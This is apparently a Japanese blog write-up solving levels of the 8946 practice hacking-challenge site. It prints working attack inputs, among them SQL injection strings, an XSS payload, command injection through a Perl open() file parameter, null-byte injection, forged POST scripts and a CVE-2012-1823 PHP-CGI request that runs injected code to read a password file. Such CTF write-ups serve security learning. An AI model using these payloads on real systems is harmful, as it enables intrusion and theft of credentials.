@@ -1,0 +1,706 @@
+	<header class="entry-header">
+		<h1 class="entry-title">8946 write up</h1>
+	</header>
+		<div class="entry-content">
+		<p><a href="http://www.hackerschool.jp/hack/" target="_blank">8946</a>という常時開催CTFをやってみたので</p>
+<blockquote><p>このサイトでは、セキュリティーに関連する問題を解くことができ、ハッキングを通してセキュリティを学ぶ事ができます。</p></blockquote>
+<p>&#8230;8946より</p>
+<p>出来ているものからwrite upを書いていきます。<br />
+随時追加していきます</p>
+<h3><strong>take#1</strong></h3>
+<p>ソースを読むとパスワードチェックというのがある<br />
+そこに書いてあるパスワードとidを入力</p>
+<hr />
+<h3><strong>take#2</strong></h3>
+<p>password.jsという明らかに怪しいjsを読み込んでいる<br />
+そこに書いてあるパスワードとidを入力</p>
+<hr />
+<h3><strong>take#3</strong></h3>
+<p>パスワードのメモにあるやつはbase64という変換方式で変換されている<br />
+逆変換して提出</p>
+<hr />
+<h3><strong>take#4</strong></h3>
+<p>ここのやつはmd5ハッシュ値というもので変換されている<br />
+md5は逆変換は出来なく変換データベースにあるものならgoogleで検索すると出てくる<br />
+検索して出てくるものを提出</p>
+<hr />
+<h3><strong>take#5</strong></h3>
+<p><a href="https://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/502.html" target="_blank">sqlインジェクション</a><br />
+というものをするid欄に</p>
+<pre class="brush:sql">' OR 1=1--</pre>
+<p>を入力するそして出てきたもので退会していないアカウントでログイン</p>
+<hr />
+<h3><strong>take#6</strong></h3>
+<p>basic認証は.htpasswdというファイルにパスワードが保存されているが、<br />
+今回はhtpassed.txtというファイル名<br />
+そこにアクセスし書いてあるのを提出</p>
+<hr />
+<h3><strong>take#7</strong></h3>
+<p>take7.phpのCookieを見るとtake7_login_statusが0となっていたのでそれを1に書き換えてアクセス</p>
+<hr />
+<h3><strong>take#8</strong></h3>
+<pre class="brush:js;">//パスワードチェック
+function fnFormSubmit(){
+	//-------------------------------------------------------------------------------------
+	var id   = 'admintake8';						//IDの設定
+	var pass = (Math.round(8%2)*(88951634/2))+(6660/4)*4/3+6726;		//パスワードの設定
+	//-------------------------------------------------------------------------------------
+		if (document.form1.id.value == id &amp;amp;&amp;amp; document.form1.pass.value == pass) {
+		alert('Congratulations! 正解！！');
+		}
+	else {
+		alert('残念！');
+	}
+	document.form1.submit();
+}
+
+</pre>
+<p>ここを計算して終わり</p>
+<hr />
+<h3><strong>take#9</strong></h3>
+<pre class="brush:js">var now = new Date();
+var seconds = now.getSeconds();//秒数取得
+	function fn_timer(){
+	now = new Date();
+	seconds = now.getSeconds();
+	document.getElementById("sec").innerHTML = seconds;//秒数を画面に表示
+	setTimeout('fn_timer()',1);
+}
+
+//入力されたナンバーのチェック
+function fn_check(){
+	//入力されたナンバー
+	var input_no = document.form1.input_no.value;
+		var answer = ( ( seconds * ( seconds - 1 ) ) / 2 )*(input_no % 2);
+		if (answer==990) {
+		document.form1.answer_val.value = seconds;
+	}
+	document.form1.submit();
+}
+</pre>
+<p>ここを計算したやつをタイミングよく提出</p>
+<hr />
+<h3><strong>take#10</strong></h3>
+<p>普通に</p>
+<pre class="brush:sql;">' OR 1=1--</pre>
+<p>を入力すると</p>
+<pre class="brush:plain;">窶ｻ ID縺ｯ闍ｱ謨ｰ蟄励〒蜈･蜉帙＠縺ｦ縺上□縺輔＞縲�</pre>
+<p>というように文字化けしている<a href="http://tools.m-bsys.com/ex/html-mojibake.php" target="_blank">ここ</a>にあるようにutf-8をsjisで読んでいる<br />
+5C問題というやつでsjisなどのマルチバイト文字などで発生する</p>
+<pre class="brush:sql">ソ' OR 1=1#</pre>
+<p>これを入力して終わり</p>
+<hr />
+<h3><strong>take#11</strong></h3>
+<p>urlでファイルが指定されているのでそこを<br />
+password.txtにする</p>
+<pre class="brush:plain">index.php?file=password.txt</pre>
+<hr />
+<h3><strong>take#12</strong></h3>
+<p>svnの管理フォルダを見るみたい<br />
+hack/svn/.svn/<br />
+にアクセスして書いてあるのを提出</p>
+<hr />
+<h3><strong>take#13</strong></h3>
+<p>ファイルはjpgではなくpsdなのでgimpなどで開くと別レイヤーに「RDPのデフォルトのポート番号は？」と書かれている<br />
+3389番ポートなので提出</p>
+<hr />
+<h3><strong>take#14</strong></h3>
+<pre class="brush:php">&lt;?php
+  $url = 'http://www.hackerschool.jp/hack/take14.php';
+    $headers = array(
+      'Referer: http://www.hackerschool.jp/hack/take14.php',
+      'Cookie: PHPSESSID=自分のPHPSSID',
+    );
+    $data = array(
+      'input_id' =&gt; '8946',
+  );
+  $options = array('http' =&gt; array(
+    'method' =&gt; 'POST',
+    'content' =&gt; http_build_query($data),
+    'header' =&gt; implode("\r\n", $headers),
+  ));
+  echo file_get_contents($url, false, stream_context_create($options));
+?&gt;</pre>
+<p>javascriptを通らずに直接POSTを送ると思ったけど<br />
+XSSの問題だったみたい</p>
+<pre class="brush:html;">"&gt;&lt;script&gt;function  fnFormSubmit(){document.form1.submit();}&lt;/script&gt;</pre>
+<p>これをID欄に入力して8946を入力するって正解ページに書かれているけどなんかできない</p>
+<hr />
+<h3><strong>take#15</strong></h3>
+<p>WiresharkなどでキャプチャーしてNetworkMinerで表示するとtake15_answer.htmlがあるのでそれを提出</p>
+<hr />
+<h3><strong>take#16</strong></h3>
+<pre class="brush:js;">if (binary(parseInt(document.form1.input_id.value))==10001011110010) {
+	alert('Congratulations! 正解！！');
+}</pre>
+<p>２進数を１０進数に変換して終わり</p>
+<hr />
+<h3><strong>take#17</strong></h3>
+<p>javascriptが２つ書かれているときは後に書かれたほうが実行されるので<br />
+input_id=13579となる</p>
+<pre class="brush:php;">&lt;?php
+  $url = 'http://www.hackerschool.jp/hack/take17.php';
+    $headers = array(
+      'Referer: http://www.hackerschool.jp/hack/take17_dummy_referrer/',
+      'Cookie: PHPSESSID=自分のPHPSSID',
+    );
+    $data = array(
+      'input_id' =&gt; '13579',
+  );
+  $options = array('http' =&gt; array(
+    'method' =&gt; 'POST',
+    'content' =&gt; http_build_query($data),
+    'header' =&gt; implode("\r\n", $headers),
+  ));
+  echo file_get_contents($url, false, stream_context_create($options));
+?&gt;</pre>
+<hr />
+<h3><strong>take#18</strong></h3>
+<pre class="brush:php;">&lt;?php
+	$pre="angou_value";
+	$ans="           ";
+	for($i=0;$i&lt;strlen($pre);$i++){
+		$y=' ';
+		if($pre[$i]=='a') $y='z';
+		if($pre[$i]=='b') $y='y';
+		if($pre[$i]=='c') $y='x';
+		if($pre[$i]=='d') $y='w';
+		if($pre[$i]=='e') $y='v';
+		if($pre[$i]=='f') $y='u';
+		if($pre[$i]=='g') $y='t';
+		if($pre[$i]=='h') $y='s';
+		if($pre[$i]=='i') $y='r';
+		if($pre[$i]=='j') $y='q';
+		if($pre[$i]=='k') $y='p';
+		if($pre[$i]=='l') $y='o';
+		if($pre[$i]=='m') $y='n';
+		if($pre[$i]=='n') $y='m';
+		if($pre[$i]=='o') $y='l';
+		if($pre[$i]=='p') $y='k';
+		if($pre[$i]=='q') $y='j';
+		if($pre[$i]=='r') $y='i';
+		if($pre[$i]=='s') $y='h';
+		if($pre[$i]=='t') $y='g';
+		if($pre[$i]=='u') $y='f';
+		if($pre[$i]=='v') $y='e';
+		if($pre[$i]=='w') $y='d';
+		if($pre[$i]=='x') $y='c';
+		if($pre[$i]=='y') $y='b';
+		if($pre[$i]=='z') $y='a';
+		if($pre[$i]=='_') $y=' ';
+		$ans[$i]=$y;
+	}
+	echo $ans;
+?&gt;</pre>
+<p>これを実行して<br />
+zmtlf ezofv<br />
+を提出</p>
+<hr />
+<h3><strong>take#19</strong></h3>
+<pre class="brush:php;">&lt;?php
+	$url = 'http://www.hackerschool.jp/hack/take19.php?id=1&amp;id2=99';
+	$headers = array(
+        'Referer: http://www.hackerschool.jp/hack/take19.php',
+		'Cookie: PHPSESSID=自分のPHPSSID',
+	); 
+	$data = array(
+		'input_id' =&gt; 'abcd',
+    	'ymd' =&gt; date('Y/m/d'),
+    	'pass' =&gt; str_rot13("whitehackerz"),
+    );
+	$options = array('http' =&gt; array(
+    'method' =&gt; 'POST',
+    'content' =&gt; http_build_query($data),
+    'header' =&gt; implode("\r\n", $headers),
+    ));
+    echo file_get_contents($url, false, stream_context_create($options));
+?&gt;</pre>
+<p>書いてあるとおりにリクエストを送る</p>
+<hr />
+<h3><strong>take#20</strong></h3>
+<p>urlがindex.pl?file=main.txtとなっておりperlのopen関数が使われていることが分かる<br />
+open関数には<a href="https://www.ipa.go.jp/security/awareness/vendor/programmingv1/a04_01.html" target="_blank">この</a>ように&#8221;|&#8221;を挟むことで任意のコマンドを実行できる脆弱性がある<br />
+index.pl?file=main.txt|lsで見てみると<br />
+main.txt<br />
+password.inc<br />
+があることが分かるので<br />
+ファイルを表示するコマンドはcatなので<br />
+index.pl?file=main.txt|cat%20password.inc<br />
+こうすると出てくる</p>
+<hr />
+<h3><strong>take#21</strong></h3>
+<p>htmlのヘッダーを見ると<br />
+PASSWORD(take#21):8946passTake21</p>
+<hr />
+<h3><strong>take#22</strong></h3>
+<p>表示されているパスワードを入力しようとすると3文字までしか入力できない</p>
+<pre class="brush:html;">&lt;input type="text" name="pass" value="" style="" maxlength="3"&gt;</pre>
+<p>maxlength=&#8221;3&#8243;で文字数制限がかかっているのでそれを消して入力</p>
+<hr />
+<h3><strong>take#23</strong></h3>
+<p>f12を押して表示</p>
+<hr />
+<h3><strong>take#24</strong></h3>
+<p><a href="http://www.hackerschool.jp/hack/reference.php" target="_blank">解説書を参照</a></p>
+<hr />
+<h3><strong>take#25</strong></h3>
+<pre class="brush:php;">&lt;?php    
+  $arr1[] = 'ぁ';
+  $arr1[] = 'あ';
+  $arr1[] = 'ぃ';
+  $arr1[] = 'い';
+  $arr1[] = 'ぅ';
+  $arr1[] = 'う';
+  $arr1[] = 'ぇ';
+  $arr1[] = 'え';
+  $arr1[] = 'ぉ';
+  $arr1[] = 'お';
+  $arr1[] = 'か';
+  $arr1[] = 'が';
+  $arr1[] = 'き';
+  $arr1[] = 'ぎ';
+  $arr1[] = 'く';
+  $arr1[] = 'ぐ';
+  $arr1[] = 'け';
+  $arr1[] = 'げ';
+  $arr1[] = 'こ';
+  $arr1[] = 'ご';
+  $arr1[] = 'さ';
+  $arr1[] = 'ざ';
+  $arr1[] = 'し';
+  $arr1[] = 'じ';
+  $arr1[] = 'す';
+  $arr1[] = 'ず';
+  $arr1[] = 'せ';
+  $arr1[] = 'ぜ';
+  $arr1[] = 'そ';
+  $arr1[] = 'ぞ';
+  $arr1[] = 'た';
+  $arr1[] = 'だ';
+  $arr1[] = 'ち';
+  $arr1[] = 'ぢ';
+  $arr1[] = 'っ';
+  $arr1[] = 'つ';
+  $arr1[] = 'づ';
+  $arr1[] = 'て';
+  $arr1[] = 'で';
+  $arr1[] = 'と';
+  $arr1[] = 'ど';
+  $arr1[] = 'な';
+  $arr1[] = 'に';
+  $arr1[] = 'ぬ';
+  $arr1[] = 'ね';
+  $arr1[] = 'の';
+  $arr1[] = 'は';
+  $arr1[] = 'ば';
+  $arr1[] = 'ぱ';
+  $arr1[] = 'ひ';
+  $arr1[] = 'び';
+  $arr1[] = 'ぴ';
+  $arr1[] = 'ふ';
+  $arr1[] = 'ぶ';
+  $arr1[] = 'ぷ';
+  $arr1[] = 'へ';
+  $arr1[] = 'べ';
+  $arr1[] = 'ぺ';
+  $arr1[] = 'ほ';
+  $arr1[] = 'ぼ';
+  $arr1[] = 'ぽ';
+  $arr1[] = 'ま';
+  $arr1[] = 'み';
+  $arr1[] = 'む';
+  $arr1[] = 'め';
+  $arr1[] = 'も';
+  $arr1[] = 'ゃ';
+  $arr1[] = 'や';
+  $arr1[] = 'ゅ';
+  $arr1[] = 'ゆ';
+  $arr1[] = 'ょ';
+  $arr1[] = 'よ';
+  $arr1[] = 'ら';
+  $arr1[] = 'り';
+  $arr1[] = 'る';
+  $arr1[] = 'れ';
+  $arr1[] = 'ろ';
+  $arr1[] = 'ゎ';
+  $arr1[] = 'わ';
+  $arr1[] = 'ゐ';
+  $arr1[] = 'ゑ';
+  $arr1[] = 'を';
+  $arr1[] = 'ん';
+  $arr1[] = 'ゔ';
+  $arr1[] = 'ゕ';
+  $arr1[] = 'ゖ';
+  $arr1[] = '゛';
+  $arr1[] = '゜';
+  $arr1[] = 'ゝ';
+  $arr1[] = 'ゞ';
+  
+  $arr2 = $arr1;
+  $arr3 = $arr1;
+  $arr4 = $arr1;
+  $count= count($arr1)-1;
+  echo $count;
+
+  for($a = 0; $a &lt;= $count; $a++){
+    for($b = 0; $b &lt;= $count; $b++){
+      for($c = 0; $c &lt;= $count; $c++){
+        for($d = 0; $d &lt;= $count; $d++){
+          $arr = $arr1[$a].$arr2[$b].$arr3[$c].$arr4[$d];
+          $arr0 = md5($arr);
+          if($arr0 === "表示されているハッシュ値"){
+            exit($arr);
+          }     
+        }
+      }   
+    } 
+  }
+  echo $arr0;
+?&gt;</pre>
+<p>これを実行</p>
+<hr />
+<h3><strong>take#26</strong></h3>
+<pre class="brush:js;">eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7 6(){c.b("l+m+j",7(){i.k("g").f="&lt;9 a=\'5 5-e\'&gt;d&amp;#h;&amp;#z;&amp;#2;&amp;#4;&amp;#w;&amp;#0; &amp;#v;&amp;#8;&amp;#1;&amp;#n; &amp;#x;&amp;#y;&amp;#A;&amp;#3;&amp;#2;&amp;#4;&amp;#2; &amp;#u;&amp;#0;&amp;#t;&amp;#8;&amp;#1;&amp;#3;&amp;#p;&amp;#1;&amp;#0;? (o / q)&lt;/9&gt;"})}r.s=6;',37,37,'1072|1085|1086|1090|1075|alert|init|function|1077|div|class|add|shortcut|Hint|info|innerHTML|hint|65306|document||getElementById|Shift|Alt|1100|MM|1080|DD|window|onload|1083|1042|1044|1076|1057|1074|1050|1103'.split('|'),0,{}))
+</pre>
+<p>このように難読化されたコードがあるので<br />
+<a href="http://jsbeautifier.org/" target="_blank">javascriptを整形</a>するやつで整形すると</p>
+<pre class="brush:html;">&lt;div class='alert alert-info'&gt;Hint&amp;#65306;&amp;#1050;&amp;#1086;&amp;#1075;&amp;#1076;&amp;#1072; &amp;#1044;&amp;#1077;&amp;#1085;&amp;#1100; &amp;#1057;&amp;#1074;&amp;#1103;&amp;#1090;&amp;#1086;&amp;#1075;&amp;#1086; &amp;#1042;&amp;#1072;&amp;#1083;&amp;#1077;&amp;#1085;&amp;#1090;&amp;#1080;&amp;#1085;&amp;#1072;? (MM / DD)&lt;/div&gt;</pre>
+<p>htmlのタグがあるのでchromeなどで開くと</p>
+<pre class="brush:plain;">Hint：Когда День Святого Валентина? (MM / DD)</pre>
+<p>このようになるのでロシア語を翻訳すると<br />
+バレンタインはいつ？(00/00)で<br />
+なので02/14を提出</p>
+<hr />
+<h3><strong>take#27</strong></h3>
+<pre class="brush:js;">setInterval('timer()',1000);
+
+setInterval('fn_timer()',1);
+
+var time = 0;
+
+function timer() {
+
+    time++;
+
+    if (time == 60) time = 0;
+
+    document.getElementById("timer").innerHTML = time;
+
+}
+
+function fn_timer() {
+
+    now = new Date();
+
+    seconds = now.getSeconds();
+
+    document.getElementById("sec").innerHTML = seconds;
+
+}
+
+function fnFormSubmit () {
+
+    pass = seconds * (time + 1) * (document.form1.pass.value % 2);
+
+    if (pass == 437 &amp;&amp; time % 2 == 0) {
+
+    	document.form1.sec.value = seconds;
+
+		document.form1.timer.value = time;
+
+        alert('Congratulations！');
+
+    } else {
+
+        alert('残念！');
+
+    }
+
+    document.form1.submit()
+
+}
+</pre>
+<p>2つの数字の差が23か19の時に1を入力</p>
+<hr />
+<h3><strong>take#28</strong></h3>
+<p>ILSpyで逆コンパイルすると</p>
+<pre class="brush:csharp;">namespace Decompile
+{
+	internal class Take28
+	{
+		public static void Main(string[] args)
+		{
+			int i = 0;
+			string b = "getTake28Password";
+			string arg = "geTX5bZt";
+			Console.WriteLine("Input the keyword!");
+			while (i &lt; 3)
+			{
+				if (Console.ReadLine() == b)
+				{
+					Console.WriteLine(string.Format("The password is {0} !", arg));
+					IL_71:
+					Console.ReadLine();
+					return;
+				}
+				if (i &lt; 2)
+				{
+					Console.WriteLine("Sorry. Try again.");
+				} 
+
+				i++;
+			}
+			Console.WriteLine("Wrong keyword. Abort.");
+			goto IL_71;
+		}
+	}
+}
+</pre>
+<p>このようにコードが出てくる<br />
+答えを聞かれてるのでargの方を提出</p>
+<hr />
+<h3><strong>take#29</strong></h3>
+<hr />
+<h3><strong>take#30</strong></h3>
+<p>全探索だけど</p>
+<pre class="brush:cpp;">#include &lt;iostream&gt;
+
+using namespace std;
+
+int Prime(int n){
+    int i;
+
+    if(n &lt; 2)
+        return 0;
+    else if(n == 2)
+        return 1;
+
+    if(n % 2 == 0)
+        return 0;
+
+    for(i = 3; i &lt;= n / i; i += 2)
+         if(n % i == 0)
+            return 0;
+    return 1;
+}
+int main(){
+	int j=0,i=0;
+	while(j!=8946){
+		i++;
+		if(Prime(i)==1){
+			j++;
+		}
+	}
+	cout&lt;&lt;i&lt;&lt;endl;
+	return 0;
+}</pre>
+<hr />
+<h3><strong>take#31</strong></h3>
+<p>バイナリエディタなどで見る</p>
+<hr />
+<h3><strong>take#32</strong></h3>
+<hr />
+<h3><strong>take#33</strong></h3>
+<p>画像のEXIF情報を見る</p>
+<hr />
+<h3><strong>take#34</strong></h3>
+<hr />
+<h3><strong>take#35</strong></h3>
+<p><a href="http://ke-tai.org/blog/2008/09/08/phoneid/" target="_blank">ケータイの端末ID・ユーザIDの取得についてまとめてみました</a>にあるようにdocomoで15文字なのでFOMA端末製造番号だとわかる<br />
+User Agentを</p>
+<pre class="brush:plain;">DoCoMo/2.0 P902i(c100;TB;W24H12;ser365079045783623;iccxxxxxxxxxxxxxxxxxxxx)</pre>
+<p>これにしてアクセス</p>
+<hr />
+<h3><strong>take#36</strong></h3>
+<hr />
+<h3><strong>take#37</strong></h3>
+<hr />
+<h3><strong>take#38</strong></h3>
+<p>書いたファイルに.htmlを追加している<br />
+追加されないように%00を最後に書いて提出する<br />
+これはnullバイト攻撃といって文字列の最後を表す%00を認識してしまうからおこる問題</p>
+<hr />
+<h3><strong>take#39</strong></h3>
+<hr />
+<h3><strong>take#40</strong></h3>
+<hr />
+<h3><strong>take#41</strong></h3>
+<hr />
+<h3><strong>take#42</strong></h3>
+<p>User Agentを8946に変更する</p>
+<hr />
+<h3><strong>take#43</strong></h3>
+<hr />
+<h3><strong>take#44</strong></h3>
+<p>$successにtrueを代入する</p>
+<pre class="brush:php;">&lt;?php
+  $url = 'http://www.hackerschool.jp/hack/take44.php';
+    $headers = array(
+      'Referer: http://www.hackerschool.jp/hack/take44.php',
+      'Cookie: PHPSESSID=自分のPHPSSID',
+    );
+    $data = array(
+      'input_id' =&gt; 'a',
+      'pass' =&gt; 'b',
+      'success' =&gt; 'true',
+  );
+  $options = array('http' =&gt; array(
+    'method' =&gt; 'POST',
+    'content' =&gt; http_build_query($data),
+    'header' =&gt; implode("\r\n", $headers),
+  ));
+  echo file_get_contents($url, false, stream_context_create($options));
+?&gt;</pre>
+<hr />
+<h3><strong>take#45</strong></h3>
+<hr />
+<h3><strong>take#46</strong></h3>
+<p>md5関数に配列を渡すとFalseとなることを利用</p>
+<pre class="brush:html;">&lt;input type="text" name="input_id" value="" style=""&gt;
+これを
+&lt;input type="text" name="input_id[]" value="" style=""&gt;
+これにするだけ
+</pre>
+<hr />
+<h3><strong>take#47</strong></h3>
+<p><a href="http://whois.jprs.jp/">whois</a>で検索<br />
+答えが更新されていないみたいで<br />
+×2016/07/31<br />
+○2014/07/31<br />
+になってる</p>
+<hr />
+<h3><strong>take#48</strong></h3>
+<p>urlにgetでnoにdXduc3kgNDg7がわたされている<br />
+Base64でデコードすると<br />
+uwnsy 48;<br />
+ヒントによるとuwnsyはprintのことらしいのでシーザー式暗号だとわかる<br />
+uwnsyはprintを5文字ずらしている<br />
+print get_pass();<br />
+を変換すると<br />
+uwnsy ljy_ufxx();<br />
+こうなり<br />
+Base64でエンコードしnoに渡すとtake#の後にpassが出てくる</p>
+<hr />
+<h3><strong>take#49</strong></h3>
+<hr />
+<h3><strong>take#50</strong></h3>
+<hr />
+<h3><strong>take#51</strong></h3>
+<p>google翻訳にかけてみるとフランス語だとわかる<br />
+フランスからアクセスする</p>
+<hr />
+<h3><strong>take#52</strong></h3>
+<p><a href="http://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html" target="_blank">CGI版PHPにリモートからスクリプト実行を許す脆弱性(CVE-2012-1823)</a><br />
+ここにあるように?をつけるとphpのオプションを指定できる<br />
+<a href="http://whitecafe.moe.hm/take52_sub/index.php?-s" target="_blank">http://whitecafe.moe.hm/take52_sub/index.php?-s</a><br />
+urlの最後に?-sをつけることによってソースが見れてしまう<br />
+さらに </p>
+<pre class="brush:plain;" >allow_url_include=On
+auto_prepend_file=php://input</pre>
+<p>これを指定すると任意のphpコードが実行できるらしい<br />
+怖い・・・</p>
+<pre class="brush:php;" > &lt;?php
+
+$id = $_POST["id"];
+$pass = $_POST["pass"];
+
+$err_msg = "";
+if(isset($_POST)){
+    if( !$id or !$pass ){
+        $err_msg = "&lt;font color='pink'&gt;※エラー！IDもしくはパスワードが違います&lt;/font&gt;&lt;br&gt;";
+    }else{
+        include_once './pass.inc';
+        if($id==$default_id AND $pass==$default_pass){
+            /*
+             * ログイン成功処理・・・
+             * この$default_idと$default_passが
+             * Take#52のIDとパスワードです
+             *
+             * ヒント：
+             * Take52の問題ページに戻ってで10回以上間違えると・・・。
+             *
+             */
+        }else{
+            $err_msg = "&lt;font color='pink'&gt;※エラー！IDもしくはパスワードが違います&lt;/font&gt;&lt;br&gt;";
+        }
+    }
+}
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Take#50｜ハッキングチャレンジサイト 8946&lt;/title&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;
+&lt;/head&gt;
+&lt;body style="font-size: 14px; background-color: rgb(0, 0, 0); color: rgb(51, 255, 51);"&gt;
+&lt;div style="text-align:center"&gt;
+&lt;h3&gt;ログインするとTake#52のパスワードが表示されます&lt;/h3&gt;
+&lt;hr size="1" &gt;
+&lt;?php
+    $body = &lt;&lt;&lt; eof
+    &lt;form action="index.php" method="post"&gt;
+    IDとパスワードを入力してログインしてください。&lt;br&gt;
+    &lt;br&gt;
+    &lt;table align="center" height="200px"&gt;
+    &lt;tr&gt;
+    &lt;td&gt;ID:&lt;/td&gt;
+    &lt;td&gt;&lt;input type="text" name="id"&gt;&lt;br&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+    &lt;td&gt;パスワード：&lt;/td&gt;
+    &lt;td&gt;&lt;input type="text" name="pass"&gt;&lt;br&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+    &lt;td colspan="2" align="center"&gt;{$err_msg}&lt;input type="submit" value="ログイン"&gt;&lt;/td&gt;
+    &lt;/tr&gt; 
+
+    &lt;/table&gt;
+    &lt;/form&gt;
+eof;
+
+print $body;
+?&gt;
+&lt;hr size="1" &gt;
+&lt;a href="http://www.hackerschool.jp/hack/" target="_blank"&gt;&lt;font size="-2" color="orange"&gt;このサイトは8946ハッキングサイトのチャンレジ問題です。&lt;/font&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<p>pass.incを読み込んでいるので</p>
+<pre class="brush:plain;" >POST http://whitecafe.moe.hm/take52_sub/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input HTTP/1.1
+Host: whitecafe.moe.hm
+Content-Length: 0
+
+&lt;?php echo readfile('pass.inc'); ?&gt;</pre>
+<p>このリクエストをfiddlerなどで送ってやると<br />
+IDとPassが出てくる</p>
+<hr />
+<h3><strong>take#53</strong></h3>
+<hr />
+<h3><strong>take#54</strong></h3>
+<hr />
+<h3><strong>take#55</strong></h3>
+<hr />
+<h3><strong>take#56</strong></h3>
+<hr />
+<h3><strong>take#57</strong></h3>
+<hr />
+<h3><strong>take#58</strong></h3>
+<p>みかか暗号でググる</p>
+<hr />
+<h3><strong>take#59</strong></h3>
+<p>ググると村上春樹の1Q84が出てくる</p>
+<hr />
+<h3><strong>take#60</strong></h3>
+<hr />
+<h3><strong>take#61</strong></h3>
+<hr />
+<h3><strong>take#62</strong></h3>
+<hr />
+<h3><strong>take#63</strong></h3>
+<p>Fiddlerなどで見ているとログインできない時は302を返しているがmenu.phpの内容が見れている<br />
+管理ユーザー管理admin_user.phpにアクセスしたらadminのパスワードが書かれたものが302で返ってくるのでそれを見る</p>
+<hr />
+<h3><strong>おわり</strong></h3>
+<p>全完への道は長い・・・</p>
+	</div>
